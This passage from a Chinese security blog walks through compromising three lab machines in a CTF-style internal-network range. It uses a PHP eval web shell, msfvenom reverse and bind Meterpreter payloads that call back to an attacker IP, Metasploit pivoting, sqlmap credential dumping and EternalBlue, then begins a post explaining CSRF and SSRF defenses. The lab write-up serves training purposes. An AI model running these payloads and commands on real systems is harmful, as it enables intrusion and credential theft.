src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><pre class="line-numbers language-none"><code class="language-none">之前：&lt;?php @eval($_POST[&#39;TeamsSix&#39;]);?&gt;之后：&lt;?php @eval([&#39;TeamsSix&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>9、不难发现$_POST被过滤了，那就利用Base64编码后再次上传试试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"PD9waHAgQGV2YWwoJF9QT1NUWydUZWFtc1NpeCddKTs/Pg=="</span> <span class="token operator">|</span> base64 -d <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS13.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>10、此时可以看到一句话已经正常，蚁剑也能够连接成功，此时已经获取到该主机的shell，下一步添加代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS14.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="b、设置代理"><a href="#b、设置代理" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><blockquote><p>注：本文中设置代理的方法参考安全客里面tinyfisher用户的一篇文章，其文章地址在本文末尾参考文章处。</p></blockquote><p>1、查看自己的IP地址，并根据自己的IP地址及目标靶机的系统类型生成对应的后门文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># ifconfig</span>root@kali:~<span class="token comment"># msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.113 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf >shell.elf</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS15.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、在kali中配置运行监听模块</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># msfconsole</span>msf5 <span class="token operator">></span> use exploit/multi/handlermsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost <span class="token number">0.0</span>.0.0msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lport <span class="token number">6666</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> optionsmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS16.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、通过蚁剑将shell.elf文件上传到Target1中，并赋予777权限以执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www:/www/wwwroot/ThinkPHP/public<span class="token punctuation">)</span> $ <span class="token function">chmod</span> <span class="token number">777</span> shell.elf<span class="token punctuation">(</span>www:/www/wwwroot/ThinkPHP/public<span class="token punctuation">)</span> $ ./shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS17.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、此时MSF获取到shell，通过meterpreter添加第二层的路由</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute -s <span class="token number">192.168</span>.22.0/24run autoroute -p这一步也可以使用run post/multi/manage/autoroute自动添加路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS18.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、在MSF中添加代理，以便让攻击机访问靶机2，经过多次测试，发现MSF使用socks5代理总是失败，因此这里还是采用了socks4</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use auxiliary/server/socks4amsf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> srvport <span class="token number">2222</span>msf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">></span> optionsmsf5 auxiliary<span class="token punctuation">(</span>server/socks4a<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS19.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、修改proxychains-ng的配置文件，这里也可以使用proxychains进行代理，不过前者是后者的升级版，因此这里使用proxychains-ng进行代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># vim /etc/proxychains.conf</span>加入以下内容：socks4 <span class="token number">192.168</span>.1.113 <span class="token number">2222</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS120.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>7、尝试扫描靶机2，该步骤如果一直提示超时，可以把MSF退出再重新配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 nmap -Pn -sT 192.168.22.22</span>-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。-sT：扫描TCP数据包已建立的连接connect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS21.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-Target2"><a href="#0x03-Target2" class="headerlink" title="0x03 Target2"></a>0x03 Target2</h1><h2 id="a、获取shell-1"><a href="#a、获取shell-1" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、上一步发现存在80端口，因此我们设置好浏览器代理后，打开看看<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS22.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS23.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、拿到站点后，经过简单的信息收集，不难找到robots.txt文件中隐藏的后台地址以及主页源码中给的提示<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS24.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS25.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS26.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>3、目前为止，步骤就很鲜明了，利用SQL注入找到后台管理员账号密码，那就用sqlmap开整吧</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS27.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、已经发现了此站点的数据库为MySQL，使用的Nginx和php，接下来找库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS28.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、看看bagecms下有哪些表</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword -D bagecms --tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS29.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>6、看一下bage_admin下的内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword -D bagecms -T bage_admin --columns</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>7、username、password自然是最感兴趣的啦，给它dump下来，在dump的过程中sqlmap会有一些提示，一路yes就行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 sqlmap -u "http://192.168.22.22/index.php?r=vul&amp;keyword=1" -p keyword -D bagecms -T bage_admin -C username,password --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS31.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>8、找到我们想要的了，登陆后台，看看有哪些功能<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS32.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>9、后台里面有文件上传的地方，有编辑主页文件的地方，为了方便，我们直接把一句话写入网站文件中<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS33.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS34.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>10、来到标签页，可以看到一句话生效了，接下里在SocksCap中打开蚁剑，利用蚁剑连接，注意SocksCap设置好代理<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS36.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="b、设置代理-1"><a href="#b、设置代理-1" class="headerlink" title="b、设置代理"></a>b、设置代理</h2><p>1、蚁剑中可以看到这是一个64位的linux系统，据此信息在MSF中生成后门</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4321 -f elf > shell2.elf</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS37.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>2、利用蚁剑将shell2.elf上传到Target2并开启监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www:/www/wwwroot/upload<span class="token punctuation">)</span> $ <span class="token function">chmod</span> <span class="token number">777</span> shell2.elf<span class="token punctuation">(</span>www:/www/wwwroot/upload<span class="token punctuation">)</span> $ ./shell2.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS38.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>3、在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/handlermsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload linux/x64/meterpreter/bind_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.22.22msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4321</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> optionsmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS39.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>4、与之前一样，我们添加Target3的路由，这里就不用设置代理了，直接添加路由即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute -s <span class="token number">192.168</span>.33.0/24run autoroute -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS40.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>5、尝试扫描Target3</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># proxychains4 nmap -Pn -sT 192.168.33.33</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS43.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-Target3"><a href="#0x03-Target3" class="headerlink" title="0x03 Target3"></a>0x03 Target3</h1><h2 id="a、获取shell-2"><a href="#a、获取shell-2" class="headerlink" title="a、获取shell"></a>a、获取shell</h2><p>1、从扫描的结果来看，不难看出这是一个开放着445、3389端口的Windows系统，那就先用永恒之蓝攻击试试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/windows/smb/ms17_010_psexecmsf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcpmsf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.33.33msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> optionsmsf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_psexec<span class="token punctuation">)</span> <span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS44.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>2、查看账户，直接修改账户密码，利用3389连接，注意要在SocksCap中运行连接远程桌面程序</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> shellC:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>net userC:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>net user Administrator <span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS46.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>到目前为止，三台靶机都已经拿下，这里推荐读者能够自己亲手尝试，找到里面的flag，其中所有flag的找寻方式，会在我的公众号“TeamsSix”推送，这里只讲述拿下三台靶机的方法。<br>这次的练习耗费了自己的大量时间，从靶场搭建到获取到第三层靶机的shell，这其中碰到的一些问题及我自己踩过的一些坑记录在下面：</p><p>1、蚁剑中查看一些文件会提示权限不足，在meterpreter中可以正常查看<br>2、蚁剑中在Target2里执行命令或者查看文件时不时会失败，初步判断是因为本地网络代理的原因，多试几次就行，总有一次是成功的<br>3、MSF中Socks5代理模块使用总是失败，Socks4a模块使用成功<br>4、MSF中建立的会话总是自动断开，将会话连接的靶机上的防火墙关闭即可<br>5、MSF中ms17_010_eternalblue模块利用总是失败，ms17_010_psexec模块使用成功<br>6、meterpreter中查看文件的路径和Windows下文件的路径里的“/”是相反的<br>7、meterpreter中上传文件大小貌似有限制，文件上传到8M左右就会提示失败，因此需要将文件压缩成多个小文件进行上传，同时上传7-zip工具（该工具只有1M大小），再利用7-zip对其解压即可，当然此方法仅适用于Windows，linux上的方法可以自行谷歌</p><blockquote><p>参考文章：<br><a href="http://zerlong.com/512.html">http://zerlong.com/512.html</a><br><a href="https://www.anquanke.com/post/id/170649">https://www.anquanke.com/post/id/170649</a><br><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a><br><a href="https://blog.csdn.net/qq_36711453/article/details/84977739">https://blog.csdn.net/qq_36711453/article/details/84977739</a><br>这些文章在很大程度上帮助了我这个菜鸟，在这里向以上文章的作者表示感谢。</p></blockquote><blockquote><p>本文首发地址：<a href="https://www.anquanke.com/post/id/187908">https://www.anquanke.com/post/id/187908</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> CFS </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>经过一场面试，我发现我还存在这些不足</title>
      <link href="//191014-090745.html"/>
      <url>//191014-090745.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近参加了一场面试，平时感觉自己学的还挺不错的，但是在面试的时候才意识到到原来自己还有那么多东西不够了解。</p><p>这其中包括以前只是听过并没有深入学习了解的东西，同时也包括以前很了解但是现在因为长时间没有去使用碰触导致已经遗忘的东西，所以本篇文章我想记录一下这次面试过程中哪些自己不太了解的知识点。</p><a id="more"></a><p>PS：</p><p>1、面试中有的问题现在已经记得不是很深刻了，所以我想起来多少就记录多少咯。</p><p>2、因为引用的文章内容都比较多，所以本文只提到了一些概念性的东西，关于每个知识点具体的详情有想看的小伙伴就自己在参考资料里面去找吧，嘿嘿 [狗头保命]</p><h1 id="0x01-SSRF和CSRF的概念以及区别"><a href="#0x01-SSRF和CSRF的概念以及区别" class="headerlink" title="0x01 SSRF和CSRF的概念以及区别"></a>0x01 SSRF和CSRF的概念以及区别</h1><p>这个知识点就属于以前有了解，但是平时很少接触以至于遗忘的类型，同时在笔试的时候就有提到这个点，笔试结束后我还特意查了一下，但是面试的时候却没有答上来，有点尴尬，下面就引用CSDN和知乎里两篇文章的描述，此处引用的文章地址为本文参考资料1和2。</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF又称跨站请求伪造，XSS就是CSRF中的一种。二者区别是XSS利用的是用户对指定网站的信任，CSRF利用是网站对用户浏览器的信任。</p><p>简单来说，CSRF是通过第三方网站伪装成正常用户登录目标网站，并以正常用户的身份对用户账号进行操作，以达到目的，CSRF攻击原理流程如下图。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>防御：</p><p>1、增加验证码机制，增加带有大量噪点的验证码，杜绝代码能够识别的简单验证码，当然了也经常被绕过。</p><p>2、验证referer,采用同源政策，referer记录着数据包的来源地址，来判断请求的合法性，但是这个可以伪造。</p><p>3、使用Token，令牌是一种将表单value的加密算法生成不同的加密结果，在服务器端进行验证。</p><p>4、在访问登录过一个网站，点击退出账户。</p><p>总结：</p><p>一次CSRF攻击成功实施，至少需要4个条件：</p><p>1、被害用户已经进行过WEB身份认证，并留有Cookie</p><p>2、新提交的请求无需重新进行身份认证或确认机制</p><p>3、攻击者了解WEB请求的参数构造</p><p>4、通过社交工程学诱使用户触发攻击的指令</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF又名服务端请求伪造攻击，如果把CSRF理解成客户端伪造请求攻击，它是利用用户本地的Cookie骗过服务器端的验证达到目的，而SSRF则是利用服务器天然能够访问内部网络的特点，进行攻击。</p><p>由此可以得出，SSRF的受害对象主要是一些服务器所连接的一些内网设备，如内网的应用程序，通过file协议获得内部网络的资料等。SSRF攻击常见于一些允许以URL作为参数，且未对URL进行过滤的服务器。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/mianshi2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如上图，若URL是正常的第三方服务器，则URL会过滤通过。若URL是带有命令操作的服务器端A，且绕过了服务器端A的过滤，则服务器端A会执行URL带有的命令，并将结果返回会客户端，由此一次SSRF攻击成功。</p><p>防御：</p><p>从以上我们可以得出，该漏洞产生的原因是由于服务端对资源进行请求的时候对URL的验证出现了纰漏，所以我们的防护策略主要是围绕URL的过滤。</p><p>1、将URL进行解析转化成IP，并使用正则表达式表示内网网址，并以此进行URL过滤。</p><p>2、建立URL白名单，只允许白名单上内容通过过滤。</p><p>3、建立内网IP黑名单，阻止对该IP的请求。</p><p>4、对返回内容进行过滤，减少敏感内容暴露。</p><p>5、禁止不需要的协议，只允许http和https协议的请求，减少file等协议的问题。</p><p>总结：</p><p>一次成功的SSRF需要2个条件：</p><p>1、攻击者知道服务器端的内网地址</p><p>2、服务器端未对请求URL进行过滤或过滤不完全</p><h1 id="0x02-SQL注入的类型以及防御"><a href="#0x02-SQL注入的类型以及防御" class="headerlink" title="0x02 SQL注入的类型以及防御"></a>0x02 